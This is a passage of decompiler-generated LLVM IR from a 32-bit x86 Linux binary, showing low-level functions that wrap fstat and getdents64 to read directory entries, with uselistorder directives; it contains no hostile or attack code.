  %v2_8054446 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054446, i32* @edx, align 4
  store i32 %v2_8054448, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054444

; uselistorder directives
  uselistorder i32 %v4_805442b, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054444, { 1, 0 }
}

define i32 @function_805444a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805444a:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805444a = load i32, i32* @ebx, align 4
  store i32 %v0_805444a, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_805445d = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_805445d, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_805445d, -4095
  br i1 %tmp13, label %dec_label_pc_8054478, label %dec_label_pc_805446a

dec_label_pc_805446a:                             ; preds = %dec_label_pc_805444a
  %v1_805446a = call i32 @function_80526c9(i32 %v0_805444a)
  %v0_805446f = load i32, i32* @ebx, align 4
  %v1_805446f = sub i32 0, %v0_805446f
  %v2_8054471 = inttoptr i32 %v1_805446a to i32*
  store i32 %v1_805446f, i32* %v2_8054471, align 4
  %v2_8054490.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805448b

dec_label_pc_8054478:                             ; preds = %dec_label_pc_805444a
  %v1_8054478 = icmp eq i32 %v4_805445d, 0
  %v1_805447a = icmp eq i1 %v1_8054478, false
  br i1 %v1_805447a, label %dec_label_pc_805448b, label %dec_label_pc_805447c

dec_label_pc_805447c:                             ; preds = %dec_label_pc_8054478
  %v4_8054483 = bitcast i32* %stack_var_-68 to i16*
  %v5_8054483 = call i32 @function_8054895(i16* %v4_8054483, i32 %arg2, i32 %v4_805445d, i32 %v4_805445d)
  %v0_805448b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805448b

dec_label_pc_805448b:                             ; preds = %dec_label_pc_8054478, %dec_label_pc_805446a, %dec_label_pc_805447c
  %v2_8054490 = phi i32 [ %v0_805444a, %dec_label_pc_8054478 ], [ %v2_8054490.pre, %dec_label_pc_805446a ], [ %v0_805444a, %dec_label_pc_805447c ]
  %v0_805448b = phi i32 [ %v4_805445d, %dec_label_pc_8054478 ], [ -1, %dec_label_pc_805446a ], [ %v0_805448b.pre, %dec_label_pc_805447c ]
  store i32 %v2_8054490, i32* @ebx, align 4
  ret i32 %v0_805448b

; uselistorder directives
  uselistorder i32 %v4_805445d, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_805448b, { 2, 0, 1 }
}

define i32 @function_8054492(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054492:
  %eax.global-to-local = alloca i32, align 4
  %v0_8054492 = load i32, i32* @edi, align 4
  %v0_8054493 = load i32, i32* @esi, align 4
  %v0_8054494 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8054499 = load i32, i32* @edx, align 4
  %v7_80544a3 = inttoptr i32 %arg2 to i32*
  %v8_80544a3 = call i32 @function_8054501(i32 %arg1, i32* %v7_80544a3, i32 %arg3, i32 %v0_8054499, i32 %v0_8054494, i32 %v0_8054493, i32 %v0_8054492)
  store i32 %v8_80544a3, i32* %eax.global-to-local, align 4
  store i32 %v8_80544a3, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_80544a3, 1
  br i1 %tmp24, label %dec_label_pc_80544fb, label %dec_label_pc_80544b1

dec_label_pc_80544b1:                             ; preds = %dec_label_pc_8054492
  %v0_80544b1 = load i32, i32* @ebx, align 4
  %v2_80544b1 = add i32 %v0_80544b1, %v8_80544a3
  store i32 %v2_80544b1, i32* @edi, align 4
  %v7_80544f74 = icmp ult i32 %v0_80544b1, %v2_80544b1
  br i1 %v7_80544f74, label %dec_label_pc_80544b6, label %dec_label_pc_80544fb

dec_label_pc_80544b6:                             ; preds = %dec_label_pc_80544b1, %dec_label_pc_80544b6
  %v0_80544b6 = phi i32 [ %v2_80544f5, %dec_label_pc_80544b6 ], [ %v0_80544b1, %dec_label_pc_80544b1 ]
  %v1_80544b6 = add i32 %v0_80544b6, 8
  %v2_80544b6 = inttoptr i32 %v1_80544b6 to i32*
  %v3_80544b6 = load i32, i32* %v2_80544b6, align 4
  store i32 %v3_80544b6, i32* %eax.global-to-local, align 4
  %v2_80544b9 = add i32 %v0_80544b6, 4
  %v3_80544b9 = inttoptr i32 %v2_80544b9 to i32*
  store i32 %v3_80544b6, i32* %v3_80544b9, align 4
  %v0_80544bc = load i32, i32* @ebx, align 4
  %v1_80544bc = add i32 %v0_80544bc, 16
  %v2_80544bc = inttoptr i32 %v1_80544bc to i32*
  %v3_80544bc = load i32, i32* %v2_80544bc, align 4
  store i32 %v3_80544bc, i32* %eax.global-to-local, align 4
  %v1_80544bf = trunc i32 %v3_80544bc to i16
  %v3_80544bf = add i32 %v0_80544bc, 8
  %v4_80544bf = inttoptr i32 %v3_80544bf to i16*
  store i16 %v1_80544bf, i16* %v4_80544bf, align 2
  %v0_80544c3 = load i32, i32* @ebx, align 4
  %v1_80544c3 = add i32 %v0_80544c3, 18
  %v2_80544c3 = inttoptr i32 %v1_80544c3 to i8*
  %v3_80544c3 = load i8, i8* %v2_80544c3, align 1
  %v4_80544c3 = zext i8 %v3_80544c3 to i32
  %v5_80544c3 = load i32, i32* %eax.global-to-local, align 4
  %v6_80544c3 = and i32 %v5_80544c3, -256
  %v7_80544c3 = or i32 %v6_80544c3, %v4_80544c3
  store i32 %v7_80544c3, i32* %eax.global-to-local, align 4
  %v3_80544c6 = add i32 %v0_80544c3, 10
  %v4_80544c6 = inttoptr i32 %v3_80544c6 to i8*
  store i8 %v3_80544c3, i8* %v4_80544c6, align 1
  %v0_80544ca = load i32, i32* @ebx, align 4
  %v1_80544ca = add i32 %v0_80544ca, 8
  %v2_80544ca = inttoptr i32 %v1_80544ca to i16*
  %v3_80544ca = load i16, i16* %v2_80544ca, align 2
  %v4_80544ca = zext i16 %v3_80544ca to i32
  %v1_80544ce = add nsw i32 %v4_80544ca, -19
  %v1_80544d2 = add i32 %v0_80544ca, 19
  %v1_80544d6 = add i32 %v0_80544ca, 11
  store i32 %v1_80544d6, i32* %eax.global-to-local, align 4
  %v3_80544da = inttoptr i32 %v1_80544d6 to i8*
  %v4_80544da = call i32 @function_80526f3(i8* %v3_80544da, i32 %v1_80544d2, i32 %v1_80544ce)
  store i32 %v4_80544da, i32* %eax.global-to-local, align 4
  %v0_80544e2 = load i32, i32* @ebx, align 4
  %v1_80544e2 = add i32 %v0_80544e2, 8
  %v2_80544e2 = inttoptr i32 %v1_80544e2 to i16*
  %v3_80544e2 = load i16, i16* %v2_80544e2, align 2
  %v4_80544e2 = zext i16 %v3_80544e2 to i32
  store i32 %v4_80544e2, i32* %eax.global-to-local, align 4
  %v3_80544e9 = inttoptr i32 %v0_80544e2 to i8*
  %v4_80544e9 = call i32 @function_80526f3(i8* %v3_80544e9, i32 %v0_80544e2, i32 %v4_80544e2)
  store i32 %v4_80544e9, i32* %eax.global-to-local, align 4
  %v0_80544ee = load i32, i32* @ebx, align 4
  %v1_80544ee = add i32 %v0_80544ee, 8
  %v2_80544ee = inttoptr i32 %v1_80544ee to i16*
  %v3_80544ee = load i16, i16* %v2_80544ee, align 2
  %v4_80544ee = zext i16 %v3_80544ee to i32
  store i32 %v4_80544ee, i32* %eax.global-to-local, align 4
  %v2_80544f5 = add i32 %v4_80544ee, %v0_80544ee
  store i32 %v2_80544f5, i32* @ebx, align 4
  %v1_80544f7 = load i32, i32* @edi, align 4
  %v7_80544f7 = icmp ult i32 %v2_80544f5, %v1_80544f7
  br i1 %v7_80544f7, label %dec_label_pc_80544b6, label %dec_label_pc_80544f7.dec_label_pc_80544fb.loopexit_crit_edge

dec_label_pc_80544f7.dec_label_pc_80544fb.loopexit_crit_edge: ; preds = %dec_label_pc_80544b6
  %v0_80544fb.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80544fb

dec_label_pc_80544fb:                             ; preds = %dec_label_pc_80544b1, %dec_label_pc_80544f7.dec_label_pc_80544fb.loopexit_crit_edge, %dec_label_pc_8054492
  %v0_80544fb = phi i32 [ %v8_80544a3, %dec_label_pc_8054492 ], [ %v0_80544fb.pre.pre, %dec_label_pc_80544f7.dec_label_pc_80544fb.loopexit_crit_edge ], [ %v8_80544a3, %dec_label_pc_80544b1 ]
  store i32 %v0_80544fb, i32* %eax.global-to-local, align 4
  store i32 %v0_8054493, i32* @esi, align 4
  store i32 %v0_8054492, i32* @edi, align 4
  ret i32 %v0_80544fb

; uselistorder directives
  uselistorder i32 %v0_80544fb, { 1, 0 }
  uselistorder i32 %v2_80544f5, { 1, 2, 0 }
  uselistorder i32 %v0_80544e2, { 1, 0, 2 }
  uselistorder i32 %v0_80544ca, { 1, 0, 2 }
  uselistorder i32 %v0_80544b6, { 1, 0 }
  uselistorder i32 %v0_80544b1, { 0, 2, 1 }
  uselistorder i32 %v8_80544a3, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_80526f3, { 2, 3, 1, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 11, { 13, 11, 12, 18, 7, 4, 8, 5, 9, 6, 10, 0, 1, 14, 15, 16, 17, 2, 3, 19, 20 }
  uselistorder label %dec_label_pc_80544fb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80544b6, { 1, 0 }
}

define i32 @function_8054501(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8054501:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_8054504 = load i32, i32* @edi, align 4
  %v0_8054506 = load i32, i32* @ebx, align 4
  %v15_8054507 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8054510 = add i32 %arg3, 30
  store i32 %arg3, i32* @edx, align 4
  %v1_8054516 = and i32 %v1_8054510, -16
  %v2_8054519 = sub i32 %v15_8054507, %v1_8054516
  %v1_805451b = add i32 %v2_8054519, 15
  %v1_805451f = and i32 %v1_805451b, -16
  %v1_8054525 = inttoptr i32 %v1_805451f to %linux_dirent64*
  store i32 %v1_805451f, i32* %ecx.global-to-local, align 4
  %v2_8054527 = add i32 %v2_8054519, -4
  %v3_8054527 = inttoptr i32 %v2_8054527 to i32*
  store i32 %v0_8054506, i32* %v3_8054527, align 4
  %v0_8054528 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_805452f = call i32 @getdents64(i32 %v0_8054528, %linux_dirent64* %v1_8054525, i32 %arg3)
  store i32 %v5_805452f, i32* %eax.global-to-local, align 4
  %v0_8054531 = load i32, i32* @esp, align 4
  %v3_8054531 = add i32 %v0_8054531, 4
  %tmp41 = icmp ult i32 %v5_805452f, -4095
  br i1 %tmp41, label %dec_label_pc_805454b, label %dec_label_pc_805453c

dec_label_pc_805453c:                             ; preds = %dec_label_pc_8054501
  %v1_805453c = call i32 @function_80526c9(i32 %v5_805452f)
  store i32 %v1_805453c, i32* %eax.global-to-local, align 4
  %v4_8054541 = sub i32 0, %v5_805452f
  store i32 %v4_8054541, i32* @edx, align 4
  %v2_8054547 = inttoptr i32 %v1_805453c to i32*
  store i32 %v4_8054541, i32* %v2_8054547, align 4
  br label %dec_label_pc_805460d

dec_label_pc_805454b:                             ; preds = %dec_label_pc_8054501
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_805451f, i32* @ebx, align 4
  %v5_80545fd = add i32 %v5_805452f, %v1_805451f
  store i32 %v5_80545fd, i32* %eax.global-to-local, align 4
  %v7_805460030 = icmp ult i32 %v1_805451f, %v5_80545fd
  br i1 %v7_805460030, label %dec_label_pc_805456a.lr.ph, label %dec_label_pc_8054608

dec_label_pc_805456a.lr.ph:                       ; preds = %dec_label_pc_805454b
  %v5_8054577 = add i32 %tmp14, %arg3
  br label %dec_label_pc_805456a

dec_label_pc_805456a:                             ; preds = %dec_label_pc_805456a.lr.ph, %dec_label_pc_80545ac
  %stack_var_-32.036 = phi i32 [ -1, %dec_label_pc_805456a.lr.ph ], [ %v3_80545af, %dec_label_pc_80545ac ]
  %stack_var_-36.035 = phi i32 [ -1, %dec_label_pc_805456a.lr.ph ], [ %v3_80545ac, %dec_label_pc_80545ac ]
  %v0_80545b834 = phi i32 [ %v1_805451f, %dec_label_pc_805456a.lr.ph ], [ %v2_80545f5, %dec_label_pc_80545ac ]
  %v1_80545bd33 = phi i32 [ %tmp14, %dec_label_pc_805456a.lr.ph ], [ %v2_805457a, %dec_label_pc_80545ac ]
  %v0_805458432 = phi i32 [ %v3_8054531, %dec_label_pc_805456a.lr.ph ], [ %v1_80545f7, %dec_label_pc_80545ac ]
  %v1_805456a = add i32 %v0_80545b834, 16
  %v2_805456a = inttoptr i32 %v1_805456a to i16*
  %v3_805456a = load i16, i16* %v2_805456a, align 2
  %v4_805456a = zext i16 %v3_805456a to i32
  %v1_805456e = add nuw nsw i32 %v4_805456a, 3
  %v1_8054574 = and i32 %v1_805456e, 131068
  store i32 %v1_8054574, i32* %ecx.global-to-local, align 4
  store i32 %v5_8054577, i32* %eax.global-to-local, align 4
  %v2_805457a = add i32 %v1_8054574, %v1_80545bd33
  %tmp42 = icmp ugt i32 %v2_805457a, %v5_8054577
  br i1 %tmp42, label %dec_label_pc_8054584, label %dec_label_pc_80545ac

dec_label_pc_8054584:                             ; preds = %dec_label_pc_805456a
  %v1_8054584 = add i32 %v0_805458432, -4
  %v2_8054584 = inttoptr i32 %v1_8054584 to i32*
  store i32 0, i32* %v2_8054584, align 4
  %v5_8054586 = add i32 %v0_805458432, -8
  %v6_8054586 = inttoptr i32 %v5_8054586 to i32*
  store i32 %stack_var_-32.036, i32* %v6_8054586, align 4
  %v5_8054589 = add i32 %v0_805458432, -12
  %v6_8054589 = inttoptr i32 %v5_8054589 to i32*
  store i32 %stack_var_-36.035, i32* %v6_8054589, align 4
  %v5_805458c = add i32 %v0_805458432, -16
  %v6_805458c = inttoptr i32 %v5_805458c to i32*
  store i32 %arg1, i32* %v6_805458c, align 4
  %v1_805458f = call i32 @function_8054717(i32 %v2_805457a)
  store i32 %v1_805458f, i32* %eax.global-to-local, align 4
  %v0_8054597 = load i32, i32* @esi, align 4
  %v15_8054597 = icmp eq i32 %v0_8054597, %tmp14
  %v1_805459a = icmp eq i1 %v15_8054597, false
  br i1 %v1_805459a, label %dec_label_pc_8054608, label %dec_label_pc_805459c

dec_label_pc_805459c:                             ; preds = %dec_label_pc_8054584
  %v1_805459c = call i32 @function_80526c9(i32 %v2_805457a)
  store i32 %v1_805459c, i32* %eax.global-to-local, align 4
  %v1_80545a1 = inttoptr i32 %v1_805459c to i32*
  store i32 22, i32* %v1_80545a1, align 4
  br label %dec_label_pc_805460d

dec_label_pc_80545ac:                             ; preds = %dec_label_pc_805456a
  %v1_80545ac = add i32 %v0_80545b834, 8
  %v2_80545ac = inttoptr i32 %v1_80545ac to i32*
  %v3_80545ac = load i32, i32* %v2_80545ac, align 4
  store i32 %v3_80545ac, i32* %eax.global-to-local, align 4
  %v1_80545af = add i32 %v0_80545b834, 12
  %v2_80545af = inttoptr i32 %v1_80545af to i32*
  %v3_80545af = load i32, i32* %v2_80545af, align 4
  %v1_80545b8 = inttoptr i32 %v0_80545b834 to i32*
  %v2_80545b8 = load i32, i32* %v1_80545b8, align 4
  store i32 %v2_80545b8, i32* %eax.global-to-local, align 4
  %v1_80545ba = add i32 %v0_80545b834, 4
  %v2_80545ba = inttoptr i32 %v1_80545ba to i32*
  %v3_80545ba = load i32, i32* %v2_80545ba, align 4
  %v2_80545bd = add i32 %v1_80545bd33, 4
  %v3_80545bd = inttoptr i32 %v2_80545bd to i32*
  store i32 %v3_80545ba, i32* %v3_80545bd, align 4
  %v0_80545c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80545c0 = load i32, i32* @esi, align 4
  %v2_80545c0 = inttoptr i32 %v1_80545c0 to i32*
  store i32 %v0_80545c0, i32* %v2_80545c0, align 4
  %v0_80545c2 = load i32, i32* @ebx, align 4
  %v1_80545c2 = add i32 %v0_80545c2, 8
  %v2_80545c2 = inttoptr i32 %v1_80545c2 to i32*
  %v3_80545c2 = load i32, i32* %v2_80545c2, align 4
  store i32 %v3_80545c2, i32* %eax.global-to-local, align 4
  %v1_80545c5 = add i32 %v0_80545c2, 12
  %v2_80545c5 = inttoptr i32 %v1_80545c5 to i32*
  %v3_80545c5 = load i32, i32* %v2_80545c5, align 4
  store i32 %v3_80545c5, i32* @edx, align 4
  %v1_80545c8 = load i32, i32* @esi, align 4
  %v2_80545c8 = add i32 %v1_80545c8, 12
  %v3_80545c8 = inttoptr i32 %v2_80545c8 to i32*
  store i32 %v3_80545c5, i32* %v3_80545c8, align 4
  %v0_80545cb = load i32, i32* %eax.global-to-local, align 4
  %v1_80545cb = load i32, i32* @esi, align 4
  %v2_80545cb = add i32 %v1_80545cb, 8
  %v3_80545cb = inttoptr i32 %v2_80545cb to i32*
  store i32 %v0_80545cb, i32* %v3_80545cb, align 4
  %v0_80545ce = load i32, i32* %ecx.global-to-local, align 4
  %v1_80545ce = trunc i32 %v0_80545ce to i16
  %v2_80545ce = load i32, i32* @esi, align 4
  %v3_80545ce = add i32 %v2_80545ce, 16
  %v4_80545ce = inttoptr i32 %v3_80545ce to i16*
  store i16 %v1_80545ce, i16* %v4_80545ce, align 2
  %v0_80545d2 = load i32, i32* @ebx, align 4
  %v1_80545d2 = add i32 %v0_80545d2, 18
  %v2_80545d2 = inttoptr i32 %v1_80545d2 to i8*
  %v3_80545d2 = load i8, i8* %v2_80545d2, align 1
  %v4_80545d2 = zext i8 %v3_80545d2 to i32
  %v5_80545d2 = load i32, i32* %eax.global-to-local, align 4
  %v6_80545d2 = and i32 %v5_80545d2, -256
  %v7_80545d2 = or i32 %v6_80545d2, %v4_80545d2
  store i32 %v7_80545d2, i32* %eax.global-to-local, align 4
  %v2_80545d5 = load i32, i32* @esi, align 4
  %v3_80545d5 = add i32 %v2_80545d5, 18
  %v4_80545d5 = inttoptr i32 %v3_80545d5 to i8*
  store i8 %v3_80545d2, i8* %v4_80545d5, align 1
  %v0_80545d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80545d8 = load i32, i32* @esp, align 4
  %v2_80545d8 = add i32 %v1_80545d8, -4
  %v3_80545d8 = inttoptr i32 %v2_80545d8 to i32*
  store i32 %v0_80545d8, i32* %v3_80545d8, align 4
  %v0_80545d9 = load i32, i32* @ebx, align 4
  %v1_80545d9 = add i32 %v0_80545d9, 16
  %v2_80545d9 = inttoptr i32 %v1_80545d9 to i16*
  %v3_80545d9 = load i16, i16* %v2_80545d9, align 2
  %v4_80545d9 = zext i16 %v3_80545d9 to i32
  %v1_80545dd = add nsw i32 %v4_80545d9, -19
  %v2_80545e0 = add i32 %v1_80545d8, -8
  %v3_80545e0 = inttoptr i32 %v2_80545e0 to i32*
  store i32 %v1_80545dd, i32* %v3_80545e0, align 4
  %v0_80545e1 = load i32, i32* @ebx, align 4
  %v1_80545e1 = add i32 %v0_80545e1, 19
  %v2_80545e4 = add i32 %v1_80545d8, -12
  %v3_80545e4 = inttoptr i32 %v2_80545e4 to i32*
  store i32 %v1_80545e1, i32* %v3_80545e4, align 4
  %v0_80545e5 = load i32, i32* @esi, align 4
  %v1_80545e5 = add i32 %v0_80545e5, 19
  store i32 %v1_80545e5, i32* %eax.global-to-local, align 4
  %v2_80545e8 = add i32 %v1_80545d8, -16
  %v3_80545e8 = inttoptr i32 %v2_80545e8 to i32*
  store i32 %v1_80545e5, i32* %v3_80545e8, align 4
  %v3_80545e9 = inttoptr i32 %v2_805457a to i16*
  %v4_80545e9 = call i32 @function_8054912(i16* %v3_80545e9, i32 %v3_80545ac, i32 %v3_80545af)
  store i32 %v4_80545e9, i32* %eax.global-to-local, align 4
  %v0_80545ee = load i32, i32* @ebx, align 4
  %v1_80545ee = add i32 %v0_80545ee, 16
  %v2_80545ee = inttoptr i32 %v1_80545ee to i16*
  %v3_80545ee = load i16, i16* %v2_80545ee, align 2
  %v4_80545ee = zext i16 %v3_80545ee to i32
  store i32 %v2_805457a, i32* @esi, align 4
  %v2_80545f5 = add i32 %v4_80545ee, %v0_80545ee
  store i32 %v2_80545f5, i32* @ebx, align 4
  %v0_80545f7 = load i32, i32* @esp, align 4
  %v1_80545f7 = add i32 %v0_80545f7, 16
  store i32 %v5_80545fd, i32* %eax.global-to-local, align 4
  %v7_8054600 = icmp ult i32 %v2_80545f5, %v5_80545fd
  br i1 %v7_8054600, label %dec_label_pc_805456a, label %dec_label_pc_8054608

dec_label_pc_8054608:                             ; preds = %dec_label_pc_805454b, %dec_label_pc_80545ac, %dec_label_pc_8054584
  %v0_8054608 = phi i32 [ %v0_8054597, %dec_label_pc_8054584 ], [ %tmp14, %dec_label_pc_805454b ], [ %v2_805457a, %dec_label_pc_80545ac ]
  store i32 %v0_8054608, i32* %eax.global-to-local, align 4
  %v5_805460a = sub i32 %v0_8054608, %tmp14
  br label %dec_label_pc_805460d

dec_label_pc_805460d:                             ; preds = %dec_label_pc_805459c, %dec_label_pc_805453c, %dec_label_pc_8054608
  %storemerge = phi i32 [ %v5_805460a, %dec_label_pc_8054608 ], [ -1, %dec_label_pc_805453c ], [ -1, %dec_label_pc_805459c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8054506, i32* @ebx, align 4
  store i32 %v0_8054504, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8054608, { 1, 0 }
  uselistorder i32 %v2_80545f5, { 0, 2, 1 }
  uselistorder i32 %v3_80545af, { 1, 0 }
  uselistorder i32 %v3_80545ac, { 1, 2, 0 }
  uselistorder i32 %v2_805457a, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_805458432, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80545b834, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_80545fd, { 2, 3, 0, 1 }
  uselistorder i32 %v5_805452f, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 15, 19, 14, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 18, 16, 0, 17 }
  uselistorder i32 (i16*, i32, i32)* @function_8054912, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 19, { 8, 9, 10, 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32 18, { 6, 7, 8, 2, 0, 1, 3, 4, 5 }
  uselistorder i32 22, { 13, 14, 5, 6, 7, 15, 3, 4, 8, 9, 10, 11, 12, 0, 1, 2 }
  uselistorder i32 -12, { 17, 37, 93, 94, 21, 22, 50, 51, 52, 53, 39, 18, 45, 48, 49, 46, 43, 20, 41, 19, 38, 47, 23, 54, 55, 44, 42, 40, 24, 56, 57, 25, 26, 58, 59, 60, 61, 62, 36, 27, 32, 29, 28, 66, 67, 0, 68, 1, 2, 86, 81, 82, 83, 33, 34, 80, 35, 84, 85, 69, 3, 4, 30, 31, 5, 70, 71, 6, 7, 72, 8, 73, 9, 10, 74, 11, 75, 12, 13, 76, 14, 77, 15, 78, 79, 63, 64, 65, 87, 88, 89, 90, 91, 16, 92 }
  uselistorder i32 -8, { 0, 8, 80, 76, 78, 77, 79, 81, 82, 22, 23, 24, 25, 26, 27, 10, 11, 17, 20, 21, 18, 15, 2, 13, 1, 9, 19, 28, 29, 30, 16, 14, 12, 3, 31, 32, 4, 33, 34, 35, 36, 37, 38, 73, 5, 58, 45, 6, 42, 43, 44, 68, 62, 63, 64, 59, 60, 61, 65, 66, 67, 46, 47, 7, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 39, 40, 41, 69, 70, 71, 72, 74, 75 }
  uselistorder i32* @esp, { 193, 194, 195, 6, 7, 8, 9, 10, 331, 332, 0, 53, 54, 55, 56, 57, 58, 59, 60, 13, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 11, 123, 15, 125, 126, 127, 106, 107, 128, 129, 130, 131, 132, 94, 95, 96, 97, 98, 43, 44, 45, 46, 47, 89, 90, 91, 92, 93, 99, 100, 102, 103, 134, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 48, 49, 50, 51, 52, 133, 78, 79, 80, 81, 82, 83, 84, 77, 85, 86, 87, 88, 101, 104, 105, 120, 121, 122, 135, 136, 137, 14, 163, 162, 138, 139, 140, 141, 142, 143, 124, 144, 145, 146, 147, 148, 149, 158, 159, 160, 150, 151, 152, 153, 154, 155, 156, 157, 12, 161, 1, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 2, 3, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 16, 213, 17, 214, 18, 215, 19, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 20, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 265, 264, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 297, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 4, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 22, 333, 334, 335, 336, 327, 328, 329, 330, 27, 337, 338, 339, 340, 26, 345, 346, 347, 348, 37, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 341, 342, 343, 344, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 28, 374, 375, 376, 38, 377, 378, 379, 380, 381, 382, 383, 385, 384, 5, 386, 387, 388, 389, 390, 391, 392, 393, 25, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 36, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 21, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 30, 29, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 31, 457, 458, 459, 460, 461, 462, 463, 32, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 33, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 34, 484, 485, 35, 486, 487, 488, 489, 490, 491, 492, 493, 494, 24, 39, 495, 496, 497, 498, 499, 500, 501, 40, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 41, 601, 602, 603, 604, 605, 606, 607, 608, 42, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 23, 626, 627, 628 }
  uselistorder i32 15, { 4, 3, 9, 1, 0, 2, 5, 6, 7, 8 }
  uselistorder i32 -16, { 14, 46, 136, 137, 19, 20, 66, 67, 68, 69, 47, 48, 51, 15, 56, 57, 62, 63, 64, 65, 58, 59, 54, 18, 52, 17, 49, 50, 60, 61, 21, 70, 71, 72, 73, 55, 53, 16, 22, 23, 74, 75, 24, 25, 77, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 133, 94, 93, 45, 92, 2, 104, 3, 27, 38, 120, 28, 105, 33, 31, 107, 32, 1, 26, 103, 29, 106, 30, 4, 12, 43, 44, 122, 11, 123, 124, 39, 40, 121, 41, 125, 42, 108, 5, 109, 34, 110, 35, 111, 6, 112, 7, 113, 114, 8, 115, 116, 9, 117, 118, 36, 119, 10, 37, 126, 127, 95, 96, 97, 98, 99, 100, 101, 102, 128, 129, 130, 131, 138, 0, 132, 13, 134, 135 }
  uselistorder i32 30, { 6, 4, 2, 1, 5, 3, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805460d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054608, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805456a, { 1, 0 }
}

define i32 @function_8054615() local_unnamed_addr {
dec_label_pc_8054615:
  %stack_var_-8 = alloca i32, align 4
  %v2_8054618 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805461f = call i32 @function_80546bf(i32 7, i32 %v2_8054618)
